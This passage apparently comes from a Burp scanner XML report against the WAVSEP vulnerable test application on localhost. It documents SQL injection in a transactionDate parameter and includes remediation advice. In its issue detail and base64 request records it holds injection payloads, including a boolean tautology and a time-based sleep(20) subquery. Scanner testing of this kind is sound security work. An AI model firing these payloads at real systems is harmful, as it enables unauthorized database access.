PTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEyNTYyMjkyMCUyMG9yJTIwNDE5MCUzZDA0MTkwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDM0DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICcyMDEwLTAxLTAxMjU2MjI5MjAgb3IgNDE5MD0wNDE5MCcKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>633616002216069120</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>79721627 or 8472=08472</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjQzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMS0wMScnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjQzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1OTQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxNzk3MjE2MjclMjBvciUyMDg0NzIlM2QwODQ3MiBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDE5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICcyMDEwLTAxLTAxNzk3MjE2Mjcgb3IgODQ3Mj0wODQ3MicKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></res